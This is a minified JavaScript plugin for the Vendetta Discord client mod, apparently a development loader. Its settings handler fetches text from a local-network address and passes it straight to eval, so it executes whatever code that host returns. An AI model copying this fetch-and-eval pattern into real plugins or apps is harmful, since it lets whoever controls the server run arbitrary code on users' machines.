(function(exports,components){"use strict";const{FormText}=components.Forms;function n(){fetch("http://192.168.0.22:3621/file").then(function(t){return t.text()}).then(function(data){return eval(data)}).catch(function(t){return React.createElement(FormText,null,"Error fetching the file")})}let o=[];var index={onLoad:function(){o.push(function(){console.log("uwu")})},onUnload:function(){for(const t of o)t()},settings:n};return exports.default=index,Object.defineProperty(exports,"__esModule",{value:!0}),exports})({},vendetta.ui.components);
